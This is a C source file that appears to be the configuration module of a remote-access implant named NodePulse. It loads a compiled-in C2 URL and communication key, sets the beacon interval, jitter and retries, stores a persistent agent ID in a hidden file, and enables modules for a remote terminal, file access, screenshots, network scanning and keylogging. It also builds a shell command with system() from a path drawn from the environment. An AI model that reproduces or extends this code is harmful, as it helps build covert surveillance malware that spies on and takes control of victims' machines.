/*
 * NodePulse Agent Configuration Implementation
 *
 * Loads compile-time config and manages persistent agent ID.
 * Uses safe string operations to prevent buffer overflows.
 */

#include "config.h"
#include "platform/platform.h"
#include "utils/safe_string.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

/* Short ID buffer */
static char g_short_id[9];

/* Agent ID file name */
#ifdef _WIN32
#define AGENT_ID_FILE ".nodepulse_id"
#else
#define AGENT_ID_FILE ".nodepulse_id"
#endif

/* Generate a UUID v4 string */
static void generate_uuid(char* buf) {
    static const char hex[] = "0123456789abcdef";
    unsigned char bytes[16];
    
    /* Seed random if not already */
    static int seeded = 0;
    if (!seeded) {
        srand((unsigned int)time(NULL) ^ (unsigned int)platform_time());
        seeded = 1;
    }
    
    /* Generate random bytes */
    for (int i = 0; i < 16; i++) {
        bytes[i] = (unsigned char)(rand() % 256);
    }
    
    /* Set version (4) and variant bits */
    bytes[6] = (bytes[6] & 0x0F) | 0x40;  /* Version 4 */
    bytes[8] = (bytes[8] & 0x3F) | 0x80;  /* Variant 1 */
    
    /* Format as UUID string: 8-4-4-4-12 */
    int pos = 0;
    for (int i = 0; i < 16; i++) {
        if (i == 4 || i == 6 || i == 8 || i == 10) {
            buf[pos++] = '-';
        }
        buf[pos++] = hex[(bytes[i] >> 4) & 0x0F];
        buf[pos++] = hex[bytes[i] & 0x0F];
    }
    buf[pos] = '\0';
}

/* Get path to agent ID file */
static void get_id_file_path(char* path, size_t size) {
#ifdef _WIN32
    const char* appdata = getenv("LOCALAPPDATA");
    if (appdata) {
        snprintf(path, size, "%s\\NodePulse\\%s", appdata, AGENT_ID_FILE);
    } else {
        snprintf(path, size, "%s", AGENT_ID_FILE);
    }
#else
    const char* home = getenv("HOME");
    if (home) {
        snprintf(path, size, "%s/.config/nodepulse/%s", home, AGENT_ID_FILE);
    } else {
        snprintf(path, size, "/tmp/%s", AGENT_ID_FILE);
    }
#endif
}

/* Ensure directory exists for path */
static void ensure_dir_exists(const char* filepath) {
#ifdef _WIN32
    char dir[512];
    strncpy(dir, filepath, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = '\0';
    
    /* Find last backslash and null-terminate there */
    char* last_sep = strrchr(dir, '\\');
    if (last_sep) {
        *last_sep = '\0';
        /* Create directory (ignore errors if exists) */
        CreateDirectoryA(dir, NULL);
    }
#else
    char dir[512];
    strncpy(dir, filepath, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = '\0';
    
    /* Find last slash and null-terminate there */
    char* last_sep = strrchr(dir, '/');
    if (last_sep) {
        *last_sep = '\0';
        /* Create directory with parents */
        char cmd[600];
        snprintf(cmd, sizeof(cmd), "mkdir -p '%s' 2>/dev/null", dir);
        system(cmd);
    }
#endif
}

/* Load or generate agent ID */
static void load_or_generate_agent_id(char* agent_id, size_t size) {
    char id_path[512];
    get_id_file_path(id_path, sizeof(id_path));
    
    /* Try to read existing ID */
    FILE* f = fopen(id_path, "r");
    if (f) {
        if (fgets(agent_id, (int)size, f)) {
            /* Remove trailing newline */
            size_t len = strlen(agent_id);
            if (len > 0 && agent_id[len-1] == '\n') {
                agent_id[len-1] = '\0';
            }
            fclose(f);
            
            /* Validate it looks like a UUID */
            if (strlen(agent_id) == 36 && agent_id[8] == '-') {
                return; /* Valid ID loaded */
            }
        }
        fclose(f);
    }
    
    /* Generate new ID */
    generate_uuid(agent_id);
    
    /* Save it */
    ensure_dir_exists(id_path);
    f = fopen(id_path, "w");
    if (f) {
        fprintf(f, "%s\n", agent_id);
        fclose(f);
    }
}

void config_init(AgentConfig* cfg) {
    if (!cfg) return;

    /* Initialize all fields to zero */
    memset(cfg, 0, sizeof(AgentConfig));

    /* Load or generate agent ID */
    load_or_generate_agent_id(cfg->agent_id, sizeof(cfg->agent_id));

    /* Copy compile-time configuration values using safe operations */
    safe_strcpy(cfg->c2_url, CONFIG_C2_URL, sizeof(cfg->c2_url));
    safe_strcpy(cfg->comm_key, CONFIG_COMM_KEY, sizeof(cfg->comm_key));
    safe_strcpy(cfg->modules, CONFIG_MODULES, sizeof(cfg->modules));

    /* Set numeric values from compile-time defines with validation */
    cfg->sync_interval = CONFIG_INTERVAL;
    if (cfg->sync_interval <= 0) cfg->sync_interval = 10;  /* Default 10 (1 second in 100ms units) */
    if (cfg->sync_interval > 600) cfg->sync_interval = 600; /* Max 60 seconds */

    cfg->jitter_percent = CONFIG_JITTER;
    if (cfg->jitter_percent < 0) cfg->jitter_percent = 20;
    if (cfg->jitter_percent > 100) cfg->jitter_percent = 100;

    cfg->max_retries = CONFIG_RETRIES;
    if (cfg->max_retries <= 0) cfg->max_retries = 3;
    if (cfg->max_retries > 10) cfg->max_retries = 10;
}

void config_parse_modules(const char* modules_str, ModuleFlags* flags) {
    if (!flags) return;
    
    /* Initialize all to disabled */
    memset(flags, 0, sizeof(ModuleFlags));
    
    if (!modules_str || strlen(modules_str) == 0) return;
    
    /* Parse comma-separated module names */
    flags->terminal   = strstr(modules_str, "terminal") != NULL;
    flags->files      = strstr(modules_str, "files") != NULL;
    flags->screenshot = strstr(modules_str, "screenshot") != NULL;
    flags->systemInfo = strstr(modules_str, "systemInfo") != NULL;
    flags->networkScan = strstr(modules_str, "networkScan") != NULL;
    flags->keylogger  = strstr(modules_str, "keylogger") != NULL;
}

const char* config_get_short_id(const AgentConfig* cfg) {
    if (!cfg) return "????????";

    safe_strcpy(g_short_id, cfg->agent_id, sizeof(g_short_id));
    return g_short_id;
}

int config_module_enabled(const AgentConfig* cfg, const char* module_name) {
    if (!cfg || !module_name) return 0;
    return strstr(cfg->modules, module_name) != NULL;
}
